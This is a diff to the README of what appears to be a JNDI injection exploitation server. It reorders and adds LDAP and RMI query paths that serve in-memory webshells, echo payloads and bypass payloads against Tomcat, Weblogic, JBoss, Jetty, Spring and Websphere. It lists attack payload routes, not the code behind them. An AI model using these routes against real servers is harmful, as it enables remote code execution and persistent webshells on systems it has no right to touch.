@@ -46,23 +46,21 @@ Supported LADP Queries：
     ldap://0.0.0.0:1389/Basic/TomcatEcho
     ldap://0.0.0.0:1389/Basic/SpringEcho
     ldap://0.0.0.0:1389/Basic/WeblogicEcho
-    ldap://0.0.0.0:1389/Basic/tomcatFilter
-    ldap://0.0.0.0:1389/Basic/tomcatFilterhead  ---need extra header [shell: true]
-    ldap://0.0.0.0:1389/Basic/WeblogicMemshell1
-    ldap://0.0.0.0:1389/Basic/WeblogicMemshell2
     ldap://0.0.0.0:1389/Basic/JBossFilter
     ldap://0.0.0.0:1389/Basic/JBossServlet
     ldap://0.0.0.0:1389/Basic/JettyFilter
     ldap://0.0.0.0:1389/Basic/JettyServlet
-    ldap://0.0.0.0:1389/Basic/tomcatFilterJmx
-    ldap://0.0.0.0:1389/Basic/tomcatFilterTh
+    ldap://0.0.0.0:1389/Basic/TomcatFilterJmx
+    ldap://0.0.0.0:1389/Basic/TomcatFilterTh
     ldap://0.0.0.0:1389/Basic/TomcatListenerJmx
     ldap://0.0.0.0:1389/Basic/TomcatListenerTh
     ldap://0.0.0.0:1389/Basic/TomcatServletJmx
     ldap://0.0.0.0:1389/Basic/TomcatServletTh
-    ldap://0.0.0.0:1389/Basic/WebsphereMemshell
-    ldap://0.0.0.0:1389/Basic/SpringInterceptor
     ldap://0.0.0.0:1389/Basic/WSFilter
+    ldap://0.0.0.0:1389/Basic/SpringInterceptor
+    ldap://0.0.0.0:1389/Basic/WebsphereMemshell
+    ldap://0.0.0.0:1389/Basic/WeblogicMemshell1
+    ldap://0.0.0.0:1389/Basic/WeblogicMemshell2
     rmi://0.0.0.0:1099/Bypass
 
 [+] Deserialize Queries: ldap://0.0.0.0:1389/Deserialization/[GadgetType]/[PayloadType]/[Params], e.g.
@@ -112,6 +110,8 @@ Supported LADP Queries：
     ldap://0.0.0.0:1389/TomcatBypass/TomcatServletTh
     ldap://0.0.0.0:1389/TomcatBypass/JBossFilter
     ldap://0.0.0.0:1389/TomcatBypass/JBossServlet
+    ldap://0.0.0.0:1389/TomcatBypass/JettyFilter
+    ldap://0.0.0.0:1389/TomcatBypass/JettyServlet
     ldap://0.0.0.0:1389/TomcatBypass/WSFilter
     ldap://0.0.0.0:1389/TomcatBypass/weblogicmemshell1
     ldap://0.0.0.0:1389/TomcatBypass/weblogicmemshell2
